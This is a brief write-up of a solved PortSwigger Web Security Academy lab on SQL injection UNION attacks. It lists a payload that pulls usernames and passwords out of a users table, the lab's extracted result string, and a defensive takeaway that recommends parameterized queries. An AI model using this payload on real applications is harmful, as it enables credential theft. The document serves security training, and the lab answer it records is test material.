# PortSwigger SQL Injection — SQL injection UNION attack, retrieving data from other tables

- Platform: PortSwigger Web Security Academy
- Category: SQL injection
- Difficulty: PRACTITIONER
- Result: solved

## Technique

users table UNION

## Key details

- Injection/object: `users`
- Table/columns/channel: `username / password`
- Key result: `an0tf46syilucu1abhif`

## Payload

```text
Pets' UNION SELECT username,password FROM users--
```

## Notes

This lab belongs to the advanced half of PortSwigger's SQL injection track. The workflow is to identify the available oracle or output channel, extract the administrator credential if required, and log in as administrator to trigger the solved state.

## Defensive takeaway

Parameterized queries are the root fix. Error suppression, WAF filters, and metadata permission reduction are useful defense-in-depth, but they do not replace binding untrusted input as data.
